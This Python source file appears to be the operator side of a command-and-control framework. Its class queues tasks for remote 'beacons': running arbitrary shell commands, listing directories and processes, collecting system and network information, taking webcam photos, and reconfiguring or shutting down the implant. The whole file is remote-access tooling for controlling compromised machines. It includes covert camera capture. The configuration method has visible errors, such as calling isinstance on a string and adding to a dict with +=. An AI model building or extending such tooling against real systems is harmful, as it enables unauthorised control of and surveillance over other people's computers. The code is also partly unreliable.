from ServerDatabase.database import DatabaseClass
from .global_objects import (
    add_beacon_command_list,
    remove_beacon_list,
    command_list
)


import colorama


class BeaconCommandsClass:
    """Handles commands within a session"""

    def __init__(self) -> None:
        self.database = DatabaseClass()  # laods database class
        colorama.init(autoreset=True)  # resets colorama after each function

    def close_connection(self, userID) -> None:
        """
        closes connection from the current session within the session commands
        """
        if (input(
                colorama.Back.RED +
                "Are you sure want to close the connection?: Y/N ").lower()
                == "y"):
            print(
                colorama.Back.YELLOW +
                colorama.Fore.BLACK +
                "Closing " + userID)

            try:
                add_beacon_command_list(userID, None, "shutdown")

            except BaseException:  # handles ssl.SSLEOFError
                pass
            remove_beacon_list(userID)

            print(colorama.Back.GREEN + "Closed")
        else:
            print(
                colorama.Back.GREEN +
                "Connection not closed")
        return

    def shell(self, userID, IPAddress) -> None:
        """runs a shell between the sessions client and server"""
        print(
            f"Shell {IPAddress}: Type exit to quit session, "
            "Please use absolute paths")
        command = input("Command: ")
        add_beacon_command_list(userID, None, "shell", command)

    def list_dir(self, userID, IPAddress) -> None:
        """runs a shell between the sessions client and server"""
        print(
            f"ListDir {IPAddress}: Type exit to quit session, "
            "Please use absolute paths")
        command = input("Directory: ")
        add_beacon_command_list(userID, None, "list_dir", command)

    def list_processes(self, userID) -> None:
        add_beacon_command_list(userID, None, "list_processes", "")
        return

    def systeminfo(self, userID) -> None:
        """gets the systeminfo of the client"""
        add_beacon_command_list(userID, None, "systeminfo", "")
        return

    def disk_usage(self, userID) -> None:
        add_beacon_command_list(userID, None, "disk_usage", "")
        return

    def dir_traversal(self, userID) -> None:
        add_beacon_command_list(userID, None, "directory_traversal", "")
        return

    def netstat(self, userID) -> None:
        add_beacon_command_list(userID, None, "netstat", "")
        return

    def takePhoto(self, userID) -> None:
        add_beacon_command_list(userID, None, "snap", "")
        return

    def list_db_commands(self, userID) -> None:
        for _, beacon_commands in command_list.items():
            if beacon_commands.beacon_uuid == userID:
                print(f"""Command ID: {beacon_commands.command_uuid}
                    Command: {beacon_commands.command}
                    Response: {beacon_commands.command_output if
                    beacon_commands.command_output
                    else "Awaiting Response"}""")
        return

    def beacon_configueration(self, userID) -> None:
        data = {}
        additional_data = "y"
        while additional_data != "n":
            command = input("Enter Configuration command: ")
            value = input("Enter configuration value: ")
            if value.isinstance(int):
                value = int(value)
            else:
                print("Value must be an integer")
            data += {command: value}
            if (input("Add another confiugration option? (y/N)"
                      ).lower() == "y"):
                continue
            else:
                break
        add_beacon_command_list(userID, None, "beacon_configueration", data)
        return
